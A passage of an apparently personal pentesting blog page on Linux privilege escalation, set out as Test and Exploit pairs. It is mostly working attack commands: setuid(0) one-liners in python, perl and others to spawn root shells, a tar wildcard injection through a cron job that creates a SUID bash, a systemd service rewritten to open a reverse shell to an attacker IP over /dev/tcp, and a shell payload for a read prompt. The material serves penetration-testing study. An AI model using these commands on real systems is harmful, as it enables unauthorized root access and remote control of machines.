<p><strong>Test</strong></p>
<pre><div class="caption"><span>list capabilities of binaries on the system</span></div><code class="highlight bash"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</code></pre>
<pre><div class="caption"><span>example output</span></div><code class="highlight plain">/usr/bin/python2.6 = cap_setuid+ep</code></pre>

<p><strong>Exploit</strong></p>
<pre><div class="caption"><span>change its user ID to root</span></div><code class="highlight bash">/usr/bin/python2.6 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>

<p>Common binaries wih capabilities</p>
<pre><code class="highlight bash">python3 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
<pre><code class="highlight bash">perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span></code></pre>
<pre><code class="highlight bash">ruby -e <span class="string">&#x27;exec &quot;/bin/bash&quot;&#x27;</span></code></pre>
<pre><code class="highlight bash">gdb -nx -ex <span class="string">&#x27;!sh&#x27;</span> -ex quit</code></pre>
<pre><code class="highlight bash">cpython -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>
<pre><code class="highlight bash">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/bash</code></pre>

<br>

<h2 id="tar-wildcard-with-cron-job"><a href="#tar-wildcard-with-cron-job" class="headerlink" title="tar wildcard (with cron job)"></a><code>tar</code> wildcard (with cron job)</h2><blockquote>
<p><strong>Wildcards in tar</strong>: When <code>tar</code> encounters filenames starting with <code>--</code>, it treats them as command-line options. This can be exploited to inject tar options like <code>--checkpoint</code> and <code>--checkpoint-action</code>, which can execute arbitrary commands.<br><strong>Cron Job</strong>: The cron job running the vulnerable script executes the <code>tar</code> command periodically, triggering the exploit when the special files are present.</p>
</blockquote>
<p><strong>Test</strong><br>Identify the vulnerability</p>
<pre><div class="caption"><span>example script</span></div><code class="highlight bash"><span class="built_in">cat</span> /home/user/compress.sh</code></pre>
<pre><div class="caption"><span>compress.sh</span></div><code class="highlight bash"><span class="meta">#!/bin/sh</span>
<span class="built_in">cd</span> /home/user
tar czf /tmp/backup.tar.gz *</code></pre>
<p>Cron job</p>
<pre><div class="caption"><span>list cron jobs</span></div><code class="highlight bash">crontab -l</code></pre>
<pre><div class="caption"><span>cron job line</span></div><code class="highlight bash">* * * * * /usr/local/bin/compress.sh</code></pre>

<p><strong>Exploit</strong><br>Create files with names that <code>tar</code> will interpret as options</p>
<pre><code class="highlight bash"><span class="comment"># Create a payload script</span>
<span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/user/runme.sh

<span class="comment"># Create special files to inject `tar` options</span>
<span class="built_in">touch</span> /home/user/--checkpoint=1
<span class="built_in">touch</span> /home/user/--checkpoint-action=<span class="built_in">exec</span>=sh\ runme.sh</code></pre>

<p>Wait for the cron job to execute</p>
<pre><code class="highlight bash"><span class="built_in">sleep</span> 60
/tmp/bash -p</code></pre>

<br>

<h2 id="Restart-service"><a href="#Restart-service" class="headerlink" title="Restart service"></a>Restart service</h2><blockquote>
<p>Locate the config file for the respective service and replace <em>action on reload</em> with a reverse shell</p>
</blockquote>
<p><strong>Test</strong></p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> -l</code></pre>
<pre><code class="highlight plain">(ALL : ALL) /usr/sbin/service vsftpd restart</code></pre>

<p><strong>Exploit</strong><br>View the config file for the service (<code>vsftpd</code> in this example)</p>
<pre><code class="highlight bash">locate vsftpd.service</code></pre>
<pre><code class="highlight plain">/etc/systemd/system/multi-user.target.wants/vsftpd.service</code></pre>
<p>Add the attacker IP in the modified service config (reverse shell).</p>
<div style="display: flex; justify-content: space-between;">
  <div style="flex: 1; padding: 2px; min-width: 300px;">
    <p>Default service configuration</p>
    <pre style="overflow-x: auto; white-space: nowrap;">
    <pre><code class="highlight conf">[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target</code></pre>
    </pre>
  </div>
  <div style="flex: 1; padding: 2px; min-width: 300px;">
    <p>Modified service configuration</p>
    <pre style="overflow-x: auto; white-space: nowrap;">
    <pre><code class="highlight conf">[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
User=root
Type=simple
ExecStart=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#x27;


[Install]
WantedBy=multi-user.target</code></pre>
    </pre>
  </div>
</div>

<br>

<h2 id="Shell-in-input-prompt"><a href="#Shell-in-input-prompt" class="headerlink" title="Shell in input prompt"></a>Shell in input prompt</h2><p><strong>Test</strong></p>
<pre><div class="caption"><span>script.sh</span></div><code class="highlight bash"><span class="meta">#!/bin/bash</span>
<span class="built_in">read</span> -p <span class="string">&quot;What&#x27;s you name: &quot;</span></code></pre>

<p><strong>Exploit</strong></p>
<pre><div class="caption"><span>payload</span></div><code class="highlight bash">/bin/bash -i</code></pre>

<br>

<hr>
<hr>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pentesting/" rel="tag"><i class="fa fa-tag"></i> Pentesting</a>
              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
              <a href="/tags/Privesc/" rel="tag"><i class="fa fa-tag"></i> Privesc</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/Pentesting/Linux/5/" rel="prev" title="5. Internal enumeration - Linux">
                  <i class="fa fa-angle-left"></i> 5. Internal enumeration - Linux
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/Pentesting/Linux/7/" rel="next" title="7. Post-exploitation - Linux">
                  7. Post-exploitation - Linux <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ChronosPK | Marin Radu</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/ChronosPK" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  




  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://chronossec.site/Pentesting/Linux/6/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
